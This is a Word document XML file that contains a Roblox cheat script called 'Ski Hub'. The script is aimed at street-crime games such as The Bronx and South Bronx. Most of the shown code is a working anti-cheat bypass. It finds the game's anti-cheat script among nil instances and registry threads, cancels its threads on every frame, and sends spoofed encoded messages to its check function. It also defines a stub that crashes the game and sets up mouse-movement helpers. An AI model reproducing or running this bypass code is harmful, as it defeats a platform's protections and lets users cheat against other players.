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 Hub TB3 Script (Patched)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">if getgenv().loaded then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">getgenv().loaded = true </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local TweenService = game:GetService("TweenService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local StarterGui = game:GetService("StarterGui")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local gui = Instance.new("ScreenGui")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>gui.IgnoreGuiInset = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local frame = Instance.new("Frame")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>frame.Size = UDim2.new(0, 270, 0, 80)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>frame.Position = UDim2.new(1, -300, 0, -100)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>frame.BackgroundTransparency = 0.15</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>frame.BorderSizePixel = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>frame.AnchorPoint = Vector2.new(0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>frame.Parent = gui</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>frame.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local title = Instance.new("TextLabel")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>title.Parent = frame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>title.Size = UDim2.new(1, -20, 0, 25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>title.Position = UDim2.new(0, 10, 0, 8)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>title.BackgroundTransparency = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>title.Font = Enum.Font.GothamBold</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>title.TextSize = 18</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>title.TextColor3 = Color3.fromRGB(255,255,255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>title.TextXAlignment = Enum.TextXAlignment.Left</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local text = Instance.new("TextLabel")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>text.Parent = frame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>text.Size = UDim2.new(1, -20, 1, -40)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>text.Position = UDim2.new(0, 10, 0, 30)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>text.BackgroundTransparency = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>text.Font = Enum.Font.Gotham</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>text.TextSize = 15</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>text.TextColor3 = Color3.fromRGB(210,210,210)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>text.TextXAlignment = Enum.TextXAlignment.Left</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>text.TextWrapped = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function notify(titleText, msg, time)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>frame.Visible = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>title.Text = titleText</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>text.Text = msg</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>Position = UDim2.new(1, -280, 0, 30)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>}):Play()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>task.wait(time)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>local tween = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>Position = UDim2.new(1, -300, 0, -100)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>tween:Play()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>tween.Completed:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:t>frame.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- notif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>notify("Ski Hub", "…", 12)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>notify("", "12.14.2025\nCheck Discord For Logs!", 10)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if LPH_OBFUSCATED == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local assert = assert</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local type = type</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local setfenv = setfenv</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_ENCNUM = function(toEncrypt, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        assert(type(toEncrypt) == "number" and #{...} == 0, "LPH_ENCNUM only accepts a single constant double or integer as an argument.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return toEncrypt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_NUMENC = LPH_ENCNUM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_ENCSTR = function(toEncrypt, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        assert(type(toEncrypt) == "string" and #{...} == 0, "LPH_ENCSTR only accepts a single constant string as an argument.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return toEncrypt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_STRENC = LPH_ENCSTR</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_ENCFUNC = function(toEncrypt, encKey, decKey, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        assert(type(toEncrypt) == "function" and type(encKey) == "string" and #{...} == 0, "LPH_ENCFUNC accepts a constant function, constant string, and string variable as arguments.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return toEncrypt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_FUNCENC = LPH_ENCFUNC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_JIT = function(f, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        assert(type(f) == "function" and #{...} == 0, "LPH_JIT only accepts a single constant function as an argument.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return f</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_JIT_MAX = LPH_JIT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_NO_VIRTUALIZE = function(f, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        assert(type(f) == "function" and #{...} == 0, "LPH_NO_VIRTUALIZE only accepts a single constant function as an argument.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return f</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_NO_UPVALUES = function(f, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        assert(type(setfenv) == "function", "LPH_NO_UPVALUES can only be used on Lua versions with getfenv &amp; setfenv")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        assert(type(f) == "function" and #{...} == 0, "LPH_NO_UPVALUES only accepts a single constant function as an argument.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local env = getrenv()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return setfenv(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LPH_NO_VIRTUALIZE(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return func(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            setmetatable(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    func = f</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    __index = env,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    __newindex = env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }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end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LPH_CRASH = function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        assert(#{...} == 0, "LPH_CRASH does not accept any arguments.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        game:Shutdown()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        while true do end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LRM_IsUserPremium = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LRM_LinkedDiscordID = "0"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LRM_ScriptName = "Ski Hub"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LRM_TotalExecutions = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LRM_SecondsLeft = math.huge</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LRM_UserNote = "Developer";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Game_Name = (game.PlaceId == 4991214437 and "Town") or (game.PlaceId == 18642421777 and "The Bronx") or (game.PlaceId == 16472538603 and "The Bronx") or (game.PlaceId == 13643807539 and "South Bronx") or (game.PlaceId == 93612682780562 and "South Bronx") or (game.PlaceId == 14413475235 and "South Bronx") or (game.PlaceId == 104715542330896 and "BlockSpin") or (game.PlaceId == 71600459831333 and "Street Life") or "Universal"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if not getexecutorname then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    getexecutorname = identifyexecutor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Solara = string.match(getexecutorname(), "Solara") == "Solara" or string.match(getexecutorname(), "Xeno") == "Xeno" or getexecutorname() == string.match(getexecutorname(), "Zorara") == "Zorara";</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local cloneref = cloneref or function(...) return ... end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Services = setmetatable({}, {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    __index = LPH_NO_VIRTUALIZE(function(self, service, key)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Solara and (service == "VirtualInputManager") and (Game_Name == "The Bronx") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return {SendKeyEvent = function() end}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return cloneref(game:GetService(service))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if Game_Name == "South Bronx" and not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">         local _getallthreads = LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local threads = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for i, v in getreg() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if type(v) == 'thread' then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(threads, v)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    return threads</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local _gettenv = LPH_JIT_MAX(function(Thread)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return getfenv(debug.info(Thread, 1, 'f'))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if gettenv then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            _gettenv = gettenv</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Filter_Nil_Instances = LPH_JIT_MAX(function(Name) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Found = nil </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, Object in getnilinstances() do  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if tostring(Object):find(Name) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Found = Object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return Found</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Filter_Table = LPH_JIT_MAX(function(Table, Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Found, Index = nil, nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, Object in Table do </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if tostring(_):lower():find(tostring(Name):lower()) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Found = Object</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Index = _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return Found, Index</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Search_Threads = LPH_JIT_MAX(function(Table, Variable)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Threads = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for NO, _thread in pairs(Table) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local T_ENV = _gettenv(_thread)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if T_ENV[Variable] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(Threads, _thread)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return Threads</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Get_AntiCheat_Threads = LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Threads = _getallthreads()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local WeHaveAHacker = Search_Threads(Threads, 'WeHaveAHacker')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if WeHaveAHacker[1] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return WeHaveAHacker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local AntiCheat_Threads = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local AntiCheat_Encoded = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            [1] = "iFPjbrlufvSzsYurCCdWeFbPeNBWzxywGWLNpzgQVVvkLaoDJjImgWFETWVzc2FnZVR5cGU=",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            [2] = "AjimhYxuTcBxLtetPTqLQKsdsjDiWNpsPSoXToFfvftufSnLTemZUVKTWVzc2FnZVUlZm8=",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            [3] = "VFevcWxuZHlvFWejJERNXupJDNxvjnIBPHBNZgSMHNOeQURICksIFETWVzc2FnZVR5cGU=",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            [4] = "RJLHPqjgyYwiGKfgSdISiCpvzGmdJKBkWUMMZHxtipCmivjZdXzDWsTWVzc2FnZUlDHbIdA=="</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Anti_Cheat_Script = Filter_Nil_Instances('?')</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not Anti_Cheat_Script then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            repeat task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Anti_Cheat_Script = Filter_Nil_Instances('?')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            until Anti_Cheat_Script~=nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local AntiCheat_Function, Function_Index = Filter_Table(getsenv(Anti_Cheat_Script), "HPv")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not AntiCheat_Function then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            repeat task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Anti_Cheat_Script = Filter_Nil_Instances('?')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AntiCheat_Function, Function_Index = Filter_Table(getsenv(Anti_Cheat_Script), "HPv")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            until AntiCheat_Function~=nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Killable_Threads = {[1] = true, [3] = true, [4] = true}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local XVNP_L = LPH_JIT_MAX(function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Random_Message = AntiCheat_Encoded[math.random(1, #AntiCheat_Encoded)]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return AntiCheat_Function(Random_Message)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Services.RunService.RenderStepped:Connect(LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            AntiCheat_Threads = Get_AntiCheat_Threads()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if AntiCheat_Threads then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for i = 1, #AntiCheat_Threads do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Thread = AntiCheat_Threads[i]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Thread and Killable_Threads[i] == true then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.cancel(Thread)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XVNP_L()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local script_key;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if LPH_OBFUSCATED then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    script_key = getfenv().script_key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if script_key then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    writefile("Ski Hub_Key.txt", script_key)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Players = Services.Players;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ReplicatedStorage = Services.ReplicatedStorage;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    UserInputService = Services.UserInputService;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Workspace = Services.Workspace;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    RunService = Services.RunService;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ProximityPromptService = Services.ProximityPromptService;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    MarketplaceService = Services.MarketplaceService;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    StarterGui = Services.StarterGui</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    VirtualInputManager = Services.VirtualInputManager;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Lighting = Services.Lighting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    mathrandom = math.random;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    mathabs = math.abs;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Mobile = UserInputService.TouchEnabled</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Cars = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Camera = Workspace.CurrentCamera</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    LocalPlayer = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Mouse = LocalPlayer:GetMouse()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Move_Mouse_Function = mousemoverel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
